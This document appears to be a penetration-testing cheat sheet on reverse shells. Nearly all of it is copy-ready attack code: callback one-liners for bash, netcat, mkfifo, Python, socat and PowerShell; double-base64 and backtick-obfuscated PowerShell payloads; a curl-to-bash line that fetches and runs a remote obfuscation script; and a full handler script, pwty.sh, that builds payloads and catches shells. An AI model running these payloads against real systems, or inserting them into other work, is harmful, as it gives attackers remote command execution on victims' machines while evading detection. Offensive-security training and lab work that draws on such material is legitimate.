# Reverse Shells

## Reverse Shells

### Reverse Shell Generator

[https://www.revshells.com/](https://www.revshells.com/)

### Bash

{% tabs %}
{% tab title="Bash" %}
{% code overflow="wrap" %}
```bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```
{% endcode %}

{% hint style="info" %}
It is recommended to encapsulate the command in a `bash -c ''` to prevent issues with the _**/dev/tcp**_ bash functionality.
{% endhint %}
{% endtab %}

{% tab title="Base64" %}
We can encode the content in **base64**, to avoid conflicts with symbols and spaces in the URL. Additionally, to prevent any _"+"_ characters from appearing, we can use double encoding.

Generate the payload:

{% code overflow="wrap" %}
```bash
echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" | base64 | base64 | xargs -I{} echo "echo {}|base64 -d|base64 -d|bash"
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Netcat

```bash
nc -e /bin/bash <ip> <port>
```

### Mkfifo

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```

### Python

{% code overflow="wrap" %}
```bash
i="<ip>" p=<port> && echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$i',$p));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')" | python
```
{% endcode %}

### Socat

```bash
socat tcp-connect:<ip>:<port> exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

### PowerShell

{% tabs %}
{% tab title="Base64" %}
Generate the payload:

{% code overflow="wrap" %}
```bash
echo '$client = New-Object System.Net.Sockets.TCPClient("<ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf-16le | base64 -w 0 | xargs echo "powershell -e"
```
{% endcode %}
{% endtab %}

{% tab title="Obfuscated" %}
Generate the payload:

{% code overflow="wrap" %}
```bash
bash <(curl -s https://raw.githubusercontent.com/villalbanico9/H4Ts/main/Tools/Reverse%20Shells/obfuscate_ps_reverse_tcp.sh) <ip> [<port>]
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Interactive TTY

{% tabs %}
{% tab title="Script" %}
```bash
script /dev/null -qc /bin/bash
```
{% endtab %}

{% tab title="Python" %}
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
{% endtab %}
{% endtabs %}

and then run:

```bash
# Press <Ctrl> + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows <rows> columns <cols>  # Check size in another window -> stty size
```

#### Automatic Shell Stabilization

I created this script which sets up a handler and automatically stabilizes Linux reverse shells. And for Windows machines uses `rlwrap` to allow command history, CTRL + L to clear the screen and other functions, also preventing CTRL + C from killing the session

<details>

<summary>pwty.sh</summary>

{% code overflow="wrap" %}
```bash
#!/bin/bash

ip="$(hostname -i | awk '{print $NF}')"
platform="Linux"

usage() {
  echo "Usage: $0 -p <port> [-i <ip>] [-P <platform>]"
  echo "  -p, --port         Port (required)"
  echo "  -i, --ip           IP address"
  echo "  -m, --platform     Platform (linux or windows)"
  echo "  -h, --help         Show this help message and exit"
  exit 1
}

listen() {
  echo -e "[*] Listening on $ip:$port for $platform connection...\n"
  if [ $platform == "Windows" ]; then
    obfuscated_string='$client  = nEW`-obj`eCT Sy`ST`eM.neT.s`OC`K`eT`s`.TcPCLIe`Nt(  "$ip",$port  )  ; $stream  =  $client.GetStream(  )  ; [byte[]]$bytes =   0..65535|%{0} ;while(( $i   =   $stream.Read($bytes, 0, $bytes.Length  )) -ne 0){ ;  $data = ( NeW-o`B`jecT -TypeName S`ySTE`M.text`.As`c`IIENCOdI`NG  ).GetString($bytes,0, $i ) ; $sendback =   (  I`ex $data 2>&1   |   o`U`T-STrINg   ) ;$sendback2  =   $sendback +   "PS "   +   ( P`wD ).Path  + "> " ; $sendbyte   =  ([text.encoding]::ASCII).GetBytes( $sendback2)  ;$stream.Write($sendbyte,0,$sendbyte.Length );$stream.Flush( )} ; $client.Close(   )'
    obfuscated_command=$(echo "$obfuscated_string" | sed "s/\$ip/$ip/" | sed "s/\$port/$port/" | iconv -t UTF-16LE | base64 -w 0)
    payload="powershell -e $obfuscated_command"
    echo -e "[+] Payload copied to clipboard:\n$payload\n"
    echo -n $payload | xclip -sel clip
    stty intr '' && rlwrap -c -a -i -r -A -D 2 -H /usr/share/rlwrap/history -s 1000 -b "\'\"\\\," -q "\"'" -pBlue -e "" -f . nc -nlvp "$port"; stty intr \^c
  else
    payload=$(echo "echo $(echo -e "bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\" & disown" | base64 -w 0 | base64 -w 0) | base64 -d | base64 -d | bash")
    echo -e "[+] Payload copied to clipboard:\n$payload\n"
    echo -n $payload | xclip -sel clip
    (echo 'script -qc /bin/bash /dev/null' && echo "export TERM=xterm && export SHELL=/bin/bash && stty $(stty -a | grep -oP 'rows [0-9]+; columns [0-9]+' | tr -d ';')" && stty raw -echo && /bin/cat; stty sane) | nc -nlvp $port
    fi
}

if [ $# -eq 0 ]; then
  usage
fi

while [[ "$#" -gt 0 ]]; do
  case $1 in
    -p|--port)
      port="$2"
      shift 2
      ;;
    -i|--ip)
      ip="$2"
      shift 2
      ;;
    -m|--platform)
      case "$2" in
        l|lin|linux)
          platform="Linux"
          ;;
        w|win|windows)
          platform="Windows"
          ;;
        *)
          echo "Error: Invalid platform. Must be linux or windows."
          exit 1
          ;;
      esac
      shift 2
      ;;
    -h|--help)
      usage
      ;;
    *)
      echo "Error: Unknown option $1"
      usage
      ;;
  esac
done

if [ -z "$port" ]; then
  echo "Error: Port is required."
  usage
fi

listen
```
{% endcode %}

</details>
